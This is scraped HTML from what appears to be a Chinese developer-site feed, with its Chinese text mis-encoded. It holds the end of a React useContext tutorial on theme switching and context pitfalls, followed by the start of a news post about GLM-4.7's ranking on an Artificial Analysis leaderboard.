    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{toggleTheme}</span>&gt;</span>
      åˆ‡æ¢åˆ° {theme === "light" ? "æš—é»‘" : "æ˜äº®"} æ¨¡å¼
    <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>
  );
}
</code></pre>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-comment">// components/Header.jsx</span>
<span class="hljs-keyword">import</span> { useTheme } <span class="hljs-keyword">from</span> <span class="hljs-string">"../contexts/ThemeContext"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Header</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> { theme } = <span class="hljs-title function_">useTheme</span>();

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">header</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">padding:</span> "<span class="hljs-attr">20px</span>", <span class="hljs-attr">borderBottom:</span> "<span class="hljs-attr">1px</span> <span class="hljs-attr">solid</span> #<span class="hljs-attr">eee</span>" }}&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>å½“å‰ä¸»é¢˜ï¼š{theme === "light" ? "ğŸŒ ç™½å¤©" : "ğŸŒ™ å¤œé—´"}<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">ThemeToggleButton</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">header</span>&gt;</span></span>
  );
}
</code></pre>
<p>åªè¦æŠŠ ThemeToggleButton æ”¾åœ¨ç»„ä»¶æ ‘çš„ä»»ä½•ä½ç½®ï¼Œéƒ½èƒ½æ§åˆ¶å…¨å±€ä¸»é¢˜ï¼Œä¸­é—´å±‚çº§å®Œå…¨æ— æ„Ÿã€‚</p>
<h2 data-id="heading-15">useContext çš„ç¼ºé™·åŠè§£å†³æ–¹æ³•ï¼ˆå®ç”¨é¿å‘æŒ‡å—ï¼‰</h2>
<p>useContext ç”¨èµ·æ¥ç¡®å®å¾ˆçˆ½ï¼Œèƒ½è½»æ¾è§£å†³è·¨å±‚çº§ä¼  props çš„éº»çƒ¦ï¼Œä½†å®ƒå¹¶ä¸æ˜¯å®Œç¾çš„â€œä¸‡èƒ½è¯â€ã€‚å¦‚æœä½ ä¸æ³¨æ„å®ƒçš„ç¼ºé™·ï¼Œé¡¹ç›®å¤§äº†ä»¥åå¾ˆå®¹æ˜“è¸©å‘ã€‚ä¸‹é¢æˆ‘æŠŠæœ€å¸¸è§çš„å‡ ä¸ªç¼ºé™·è®²æ¸…æ¥šï¼Œå¹¶ç»™å‡ºçœŸå®å¯è¡Œçš„é¢„é˜²åŠæ³•ã€‚</p>
<h3 data-id="heading-16">1. <strong>æ€§èƒ½é—®é¢˜ï¼šä¸å¿…è¦çš„é‡æ¸²æŸ“</strong></h3>
<p><strong>ç¼ºé™·æè¿°</strong> å½“ Context çš„ value å€¼å‘ç”Ÿå˜åŒ–æ—¶ï¼Œæ‰€æœ‰æ¶ˆè´¹äº†è¿™ä¸ª Context çš„ç»„ä»¶ï¼ˆå“ªæ€•åªç”¨äº† value é‡Œçš„ä¸€å°éƒ¨åˆ†ï¼‰éƒ½ä¼šè¢«è¿«é‡æ–°æ¸²æŸ“ã€‚</p>
<p>ä¸¾ä¸ªä¾‹å­ï¼š</p>
<pre><code class="hljs language-jsx" lang="jsx">&lt;<span class="hljs-title class_">ThemeContext</span>.<span class="hljs-property">Provider</span> value={{ theme, user, toggleTheme, logout }}&gt;
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">WholeApp</span> /&gt;</span></span>
&lt;/<span class="hljs-title class_">ThemeContext</span>.<span class="hljs-property">Provider</span>&gt;
</code></pre>
<p>å¦‚æœ user æ”¹å˜äº†ï¼Œæ•´ä¸ª App é‡Œæ‰€æœ‰ç”¨äº† useContext(ThemeContext) çš„ç»„ä»¶ï¼ˆåŒ…æ‹¬åªå…³å¿ƒ theme çš„æŒ‰é’®ï¼‰éƒ½ä¼šé‡æ¸²æŸ“ï¼Œå“ªæ€•ä¸»é¢˜æ ¹æœ¬æ²¡å˜ã€‚</p>
<p><strong>é¢„é˜²åŠæ³•</strong></p>
<ul>
<li>
<p><strong>æ‹†åˆ† Context</strong>ï¼šæŠŠå˜åŒ–é¢‘ç‡ä¸åŒçš„æ•°æ®æ‹†åˆ°ä¸åŒçš„ Context é‡Œã€‚ æ¨èåšæ³•ï¼š</p>
<pre><code class="hljs language-jsx" lang="jsx">&lt;<span class="hljs-title class_">ThemeContext</span>.<span class="hljs-property">Provider</span> value={{ theme, toggleTheme }}&gt;
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">UserContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">user</span>, <span class="hljs-attr">logout</span> }}&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">App</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">UserContext.Provider</span>&gt;</span></span>
&lt;/<span class="hljs-title class_">ThemeContext</span>.<span class="hljs-property">Provider</span>&gt;
</code></pre>
<p>è¿™æ ·ä¸»é¢˜åˆ‡æ¢ä¸ä¼šå¯¼è‡´ç”¨æˆ·ç›¸å…³çš„ç»„ä»¶é‡æ¸²æŸ“ï¼Œåä¹‹äº¦ç„¶ã€‚</p>
</li>
<li>
<p><strong>ä½¿ç”¨ memo ä¼˜åŒ– value</strong>ï¼šé¿å…æ¯æ¬¡æ¸²æŸ“éƒ½åˆ›å»ºæ–°å¯¹è±¡ã€‚</p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-keyword">const</span> value = <span class="hljs-title function_">useMemo</span>(
  <span class="hljs-function">() =&gt;</span> ({ theme, toggleTheme }),
  [theme, toggleTheme]  <span class="hljs-comment">// åªæœ‰ä¾èµ–å˜åŒ–æ—¶æ‰åˆ›å»ºæ–°å¯¹è±¡</span>
);

<span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ThemeContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">{value}</span>&gt;</span>{children}<span class="hljs-tag">&lt;/<span class="hljs-name">ThemeContext.Provider</span>&gt;</span></span>;
</code></pre>
</li>
<li>
<p><strong>æ¶ˆè´¹æ–¹ç»“åˆ useMemo / useCallback</strong>ï¼šå¦‚æœç»„ä»¶å†…éƒ¨è®¡ç®—ä»£ä»·å¤§ï¼Œå¯ä»¥è¿›ä¸€æ­¥ä¼˜åŒ–ã€‚</p>
</li>
</ul>
<h3 data-id="heading-17">2. <strong>è°ƒè¯•å›°éš¾ï¼šæ•°æ®æ¥æºä¸æ˜ç¡®</strong></h3>
<p><strong>ç¼ºé™·æè¿°</strong> ç»„ä»¶ç›´æ¥é€šè¿‡ useContext æ‹¿æ•°æ®ï¼Œä½ ä¸€çœ¼çœ‹ä¸å‡ºè¿™ä¸ªæ•°æ®åˆ°åº•æ˜¯ä»å“ªä¸ª Provider æä¾›çš„ï¼Œå°¤å…¶æ˜¯é¡¹ç›®å¤§äº†ï¼ŒåŒä¸€ä¸ª Context å¯èƒ½è¢«å¤šä¸ª Provider åŒ…è£¹ï¼ˆåµŒå¥— Providerï¼‰ã€‚</p>
<p><strong>é¢„é˜²åŠæ³•</strong></p>
<ul>
<li>
<p><strong>ç»™ Context èµ·æœ‰æ„ä¹‰çš„åå­—</strong>ï¼šä¸è¦å« DataContextï¼Œè€Œæ˜¯ UserContextã€ThemeContextã€CartContextã€‚</p>
</li>
<li>
<p><strong>Provider æ”¾å›ºå®šä½ç½®</strong>ï¼šå…¨å±€çš„æ”¾ App æ ¹éƒ¨ï¼Œå±€éƒ¨çš„æ”¾å¯¹åº”æ¨¡å—çš„æ ¹ç»„ä»¶ã€‚</p>
</li>
<li>
<p><strong>è‡ªå®šä¹‰ Hook å°è£…</strong>ï¼š</p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">useTheme</span> = (<span class="hljs-params"/>) =&gt; <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">ThemeContext</span>);
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">useUser</span> = (<span class="hljs-params"/>) =&gt; <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">UserContext</span>);
</code></pre>
<p>ä½¿ç”¨æ—¶ç›´æ¥ const { theme } = useTheme();ï¼Œä¸€çœ¼å°±çŸ¥é“æ•°æ®æ¥æºã€‚</p>
</li>
</ul>
<h3 data-id="heading-18">3. <strong>é»˜è®¤å€¼é™·é˜±</strong></h3>
<p><strong>ç¼ºé™·æè¿°</strong> createContext(defaultValue) çš„é»˜è®¤å€¼åªåœ¨<strong>å®Œå…¨æ²¡æœ‰åŒ¹é…åˆ° Provider</strong> æ—¶æ‰ç”Ÿæ•ˆã€‚å¾ˆå¤šäººè¯¯ä»¥ä¸ºå®ƒèƒ½å½“â€œåˆå§‹å€¼â€ç”¨ï¼Œå¯¼è‡´è°ƒè¯•æ—¶å›°æƒ‘ã€‚</p>
<p><strong>é¢„é˜²åŠæ³•</strong></p>
<ul>
<li>
<p>é»˜è®¤å€¼ä¸€èˆ¬ä¼  null æˆ– undefinedï¼Œå¹¶åœ¨æ¶ˆè´¹æ—¶åšå¥½ç©ºå€¼åˆ¤æ–­ï¼š</p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-keyword">const</span> user = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">UserContext</span>);
<span class="hljs-keyword">if</span> (!user) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'UserInfo å¿…é¡»åœ¨ UserProvider å†…éƒ¨ä½¿ç”¨'</span>);
</code></pre>
</li>
<li>
<p>æˆ–è€…å¹²è„†ä¸ä¾èµ–é»˜è®¤å€¼ï¼Œæ‰€æœ‰æ•°æ®éƒ½åœ¨ Provider é‡Œæä¾›ã€‚</p>
</li>
</ul>
<h3 data-id="heading-19">4. <strong>ä¸é€‚åˆé«˜é¢‘æ›´æ–°çš„æ•°æ®</strong></h3>
<p><strong>ç¼ºé™·æè¿°</strong> å¦‚æœä½ æŠŠä¸€ä¸ªé«˜é¢‘å˜åŒ–çš„çŠ¶æ€ï¼ˆæ¯”å¦‚è¾“å…¥æ¡†å†…å®¹ã€é¼ æ ‡ä½ç½®ã€å®æ—¶è®¡æ•°å™¨ï¼‰æ”¾è¿› Contextï¼Œä¼šå¯¼è‡´å¤§é‡ç»„ä»¶é¢‘ç¹é‡æ¸²æŸ“ï¼Œæ€§èƒ½é›ªå´©ã€‚</p>
<p><strong>é¢„é˜²åŠæ³•</strong></p>
<ul>
<li>é«˜é¢‘çŠ¶æ€åšå†³ç”¨å±€éƒ¨ state æˆ–å…¶ä»–æ›´ç²¾ç»†çš„æ–¹æ¡ˆï¼ˆæ¯”å¦‚ Zustandã€Jotai çš„ atomï¼‰ã€‚</li>
<li>Context åªæ”¾â€œç›¸å¯¹ç¨³å®šâ€æˆ–â€œå…¨å±€å¿…è¦â€çš„æ•°æ®ï¼šä¸»é¢˜ã€ç”¨æˆ·ä¿¡æ¯ã€è¯­è¨€ã€è·¯ç”±çŠ¶æ€ç­‰ã€‚</li>
</ul>
<h3 data-id="heading-20">5. <strong>åµŒå¥— Provider æ—¶ä»·å€¼è¦†ç›–é—®é¢˜</strong></h3>
<p><strong>ç¼ºé™·æè¿°</strong> åŒä¸€ä¸ª Context å¯ä»¥åµŒå¥—å¤šä¸ª Providerï¼Œåé¢çš„ä¼šè¦†ç›–å‰é¢çš„ valueã€‚</p>
<pre><code class="hljs language-jsx" lang="jsx">&lt;<span class="hljs-title class_">ThemeContext</span>.<span class="hljs-property">Provider</span> value={{ <span class="hljs-attr">theme</span>: <span class="hljs-string">'light'</span> }}&gt;
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Child</span> /&gt;</span></span>
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ThemeContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">theme:</span> '<span class="hljs-attr">dark</span>' }}&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">GrandChild</span> /&gt;</span>  {/* è¿™é‡Œæ‹¿åˆ° dark */}
  <span class="hljs-tag">&lt;/<span class="hljs-name">ThemeContext.Provider</span>&gt;</span></span>
&lt;/<span class="hljs-title class_">Child</span>&gt;
</code></pre>
<p>è¿™æœ¬æ¥æ˜¯ç‰¹æ€§ï¼Œä½†å¦‚æœä¸å°å¿ƒåµŒå¥—é”™äº†ï¼Œå°±ä¼šå‡ºç°â€œä¸»é¢˜çªç„¶å˜äº†ä½†æ‰¾ä¸åˆ°åŸå› â€çš„è¯¡å¼‚ bugã€‚</p>
<p><strong>é¢„é˜²åŠæ³•</strong></p>
<ul>
<li>å…¨å±€ Context åªåœ¨æœ€å¤–å±‚æä¾›ä¸€æ¬¡ã€‚</li>
<li>å¦‚æœéœ€è¦å±€éƒ¨è¦†ç›–ï¼ˆå¦‚æŸä¸ªé¡µé¢å¼ºåˆ¶æš—è‰²ï¼‰ï¼Œæ˜ç¡®æ³¨é‡Šå¹¶æ§åˆ¶èŒƒå›´ã€‚</li>
</ul>
<h3 data-id="heading-21">æ€»ç»“ï¼šuseContext é€‚ç”¨åœºæ™¯ä¸æ›¿ä»£æ–¹æ¡ˆ</h3>






























<table><thead><tr><th>é€‚ç”¨åœºæ™¯</th><th>ä¸é€‚ç”¨åœºæ™¯</th><th>æ¨èæ›¿ä»£æ–¹æ¡ˆ</th></tr></thead><tbody><tr><td>ä¸»é¢˜åˆ‡æ¢</td><td>é«˜é¢‘çŠ¶æ€ï¼ˆå¦‚è¾“å…¥æ¡†ã€åŠ¨ç”»ï¼‰</td><td>å±€éƒ¨ state / Zustand</td></tr><tr><td>ç”¨æˆ·ä¿¡æ¯ã€æƒé™</td><td>å¤æ‚çš„å¤§å‹çŠ¶æ€ç®¡ç†</td><td>Redux Toolkit / Zustand</td></tr><tr><td>å›½é™…åŒ–ï¼ˆi18nï¼‰</td><td>éœ€è¦ä¸­é—´ä»¶ã€å¼‚æ­¥ action</td><td>Redux / Recoil / Jotai</td></tr><tr><td>ç›¸å¯¹ç¨³å®šçš„å…¨å±€é…ç½®</td><td>éœ€è¦ç»†ç²’åº¦è®¢é˜…å•ä¸ªå­—æ®µ</td><td>Jotai / Zustand</td></tr></tbody></table>
<p><strong>æˆ‘çš„ä¸ªäººå»ºè®®</strong>ï¼š</p>
<ul>
<li>å°ä¸­å‹é¡¹ç›®ï¼šå¤§èƒ†ç”¨ useContext + useReducer å°±å¤Ÿäº†ï¼Œç®€å•é«˜æ•ˆã€‚</li>
<li>å¤§å‹é¡¹ç›®ï¼šç”¨ useContext åªåšâ€œæä¾›èƒ½åŠ›â€ï¼ˆProvider åŒ…è£¹ï¼‰ï¼ŒçœŸæ­£å¤æ‚çŠ¶æ€ç®¡ç†äº¤ç»™æ›´ä¸“ä¸šçš„åº“ï¼ˆå¦‚ Zustandï¼Œå®ƒç»“åˆäº† Context çš„ç®€å•å’Œ Redux çš„å¼ºå¤§ï¼‰ã€‚</li>
</ul>
<p>ç”¨å¥½äº†ï¼ŒuseContext æ˜¯ä¼˜é›…çš„ï¼›ç”¨ä¸å¥½ï¼Œå®ƒä¼šè®©ä½ åœ¨é‡æ¸²æŸ“åœ°ç‹±é‡Œæ€€ç–‘äººç”Ÿã€‚å…³é”®å°±ä¸¤ç‚¹ï¼š</p>
<ol>
<li>æ‹†åˆ† Context</li>
<li>memo ä½ value</li>
</ol>
<h2 data-id="heading-22">å°ç»“ï¼šä»€ä¹ˆæ—¶å€™ç”¨ useContext</h2>
<ul>
<li>éœ€è¦è·¨å¤šå±‚çº§å…±äº«æ•°æ®æ—¶ï¼ˆç”¨æˆ·ä¿¡æ¯ã€ä¸»é¢˜ã€è¯­è¨€ã€æƒé™ç­‰å…¨å±€çŠ¶æ€ï¼‰</li>
<li>æ•°æ®ä¼šåœ¨å¤šä¸ªä¸ç›¸é‚»çš„ç»„ä»¶ä¸­ä½¿ç”¨</li>
<li>ä¸æƒ³å†™ä¸€å †æ— æ„ä¹‰çš„ props ä¸­è½¬ä»£ç </li>
</ul>
<p>æ³¨æ„äº‹é¡¹ï¼š</p>
<ul>
<li>Context è§¦å‘æ›´æ–°æ—¶ï¼Œæ‰€æœ‰æ¶ˆè´¹äº†è¿™ä¸ª Context çš„ç»„ä»¶éƒ½ä¼šé‡æ–°æ¸²æŸ“ã€‚å»ºè®®æŠŠå˜åŒ–é¢‘ç‡é«˜çš„çŠ¶æ€å’Œç¨³å®šçš„çŠ¶æ€åˆ†å¼€å¤šä¸ª Contextã€‚</li>
<li>å¯¹äºå¤æ‚çš„å¤§å‹åº”ç”¨ï¼Œæ¨èæ­é… useReducer æˆ–ç›´æ¥ä½¿ç”¨æˆç†Ÿçš„çŠ¶æ€ç®¡ç†åº“ï¼ˆå¦‚ Zustandã€Redux Toolkitï¼‰ã€‚</li>
</ul>
<p>é€šè¿‡è¿™ä¸ªä¸»é¢˜åˆ‡æ¢çš„å° demoï¼Œæˆ‘å½»åº•æ„Ÿå—åˆ° useContext çš„ä¼˜é›…ï¼šæ•°æ®ç®¡ç†é›†ä¸­ã€æ¶ˆè´¹æ–¹ä¸»åŠ¨è·å–ã€é…åˆ CSS å˜é‡å®ç°çœŸæ­£çš„å…¨å±€æ ·å¼åˆ‡æ¢ï¼Œä»£ç æ¸…æ™°ä¸”æ‰©å±•æ€§æå¼ºã€‚</p>
<p>å¦‚æœä½ è¿˜åœ¨è¢« props ä¸€å±‚ä¸€å±‚å¾€ä¸‹ä¼ æŠ˜ç£¨ï¼Œä¸å¦¨ç«‹åˆ»è¯•è¯• useContextï¼Œç›¸ä¿¡æˆ‘ï¼Œç”¨è¿‡ä¸€æ¬¡å°±å†ä¹Ÿå›ä¸å»äº†ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[é—­æºçš„å¢™è§’è¢«æŒ–å¡Œäº†ï¼ŸGLM-4.7ç™»é¡¶å¼€æºç‹åº§ï¼Œè¿™å›çœŸä¸å…´å˜²è®½]]></title>    <link>https://juejin.cn/post/7589172193150599204</link>    <guid>https://juejin.cn/post/7589172193150599204</guid>    <pubDate>2025-12-29T16:26:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589172193150599204" data-draft-id="7589099845187059748" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="é—­æºçš„å¢™è§’è¢«æŒ–å¡Œäº†ï¼ŸGLM-4.7ç™»é¡¶å¼€æºç‹åº§ï¼Œè¿™å›çœŸä¸å…´å˜²è®½"/> <meta itemprop="keywords" content="AIGC"/> <meta itemprop="datePublished" content="2025-12-29T16:26:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¢¨é£å¦‚é›ª"/> <meta itemprop="url" content="https://juejin.cn/user/4064249017803927"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            é—­æºçš„å¢™è§’è¢«æŒ–å¡Œäº†ï¼ŸGLM-4.7ç™»é¡¶å¼€æºç‹åº§ï¼Œè¿™å›çœŸä¸å…´å˜²è®½
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4064249017803927/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¢¨é£å¦‚é›ª
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T16:26:35.000Z" title="Mon Dec 29 2025 16:26:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>2025å¹´çš„å¹´åº•å¹¶ä¸å¹³é™ã€‚å°±åœ¨å¤§å®¶å‡†å¤‡è¿‡åŒæ—¦å‡æœŸçš„æ—¶å€™ï¼Œæ™ºè°±AIåƒæ˜¯æ•…æ„ç»™è¡Œä¸šæ‰”äº†ä¸ªâ€œæ·±æ°´ç‚¸å¼¹â€ï¼Œå‘å¸ƒäº†æœ€æ–°çš„GLM-4.7ã€‚</p>
<p>è¯´å®è¯ï¼Œè¿™ä¸¤å¹´å›½äº§å¤§æ¨¡å‹å‘å¸ƒä¼šæˆ‘çœ‹ç´¯äº†ï¼Œå‚æ•°åˆ·æ¦œçš„æ¶ˆæ¯ä¹Ÿå¬éº»äº†ã€‚ä½†è¿™æ¬¡çš„æƒ…å†µæœ‰ç‚¹ä¸ä¸€æ ·ã€‚è¿™æ¬¡æ‹¿å‡ºæ¥çš„æˆç»©å•ï¼Œä¸æ˜¯è‡ªå®¶åšçš„PPTï¼Œè€Œæ˜¯æ¥è‡ªArtificial Analysisã€‚åœ¨è¿™ä¸ªè¢«OpenAIã€è°·æ­Œå½“åšé‡‘æ ‡å‡†çš„è¯„æµ‹é‡Œï¼ŒGLM-4.7å¹²äº†ä¸€ä»¶è®©å¼€æºç¤¾åŒºç‚¸é”…çš„äº‹ï¼šå®ƒæ‹¿åˆ°äº†å…¨çƒå¼€æºæ¨¡å‹çš„ç¬¬ä¸€åã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.worldcodeing.com%2Fwp-content%2Fuploads%2F2025%2F12%2FiShot_2025-12-30_00.17.07-1024x342.png" target="_blank" title="https://blog.worldcodeing.com/wp-content/uploads/2025/12/iShot_2025-12-30_00.17.07-1024x342.png" ref="nofollow noopener noreferrer"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9fea4484fa21411ea975a955d5dced96~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767630394&amp;x-signature=RhdYFEfw%2FNd%2F%2BjJu5vDp6Ne1k4c%3D" alt="iShot_2025-12-30_00.17.07" loading="lazy"/></a></p>
<p><strong>è¿™ä¹Ÿå¤ªâ€œå·â€äº†</strong></p>
<p>å…ˆçœ‹ä¸€å¼ æ›´æœ‰è¯´æœåŠ›çš„æˆç»©å•ã€‚åœ¨AAIIï¼ˆArtificial Analysis Intelligence Indexï¼‰åˆšåˆšæ›´æ–°çš„æ¦œå•é‡Œï¼ŒGLM-4.7æ‹¿åˆ°äº†68åˆ†çš„ç»¼åˆå¾—åˆ†ã€‚</p>
<p>è¿™ä¸ªåˆ†æ•°æ„å‘³ç€ä»€ä¹ˆï¼Ÿ</p>
<p>å¾€ä¸Šçœ‹ï¼Œå®ƒåœ¨å…¨çƒæ€»æ¦œé‡Œæ’ç¬¬å…­ã€‚æ’åœ¨å®ƒå‰é¢çš„ï¼Œå…¨æ˜¯GPT-5.2ã€Gemini 3 Proè¿™ç§é—­æºå·¨å¤´ï¼Œä¹Ÿå°±æ˜¯é‚£ç§ä½ æ¯ä¸ªæœˆå¾—æ20åˆ€ç”šè‡³æ›´å¤šæ‰èƒ½ç”¨ä¸Šçš„â€œè´µæ—â€æ¨¡å‹ã€‚</p>
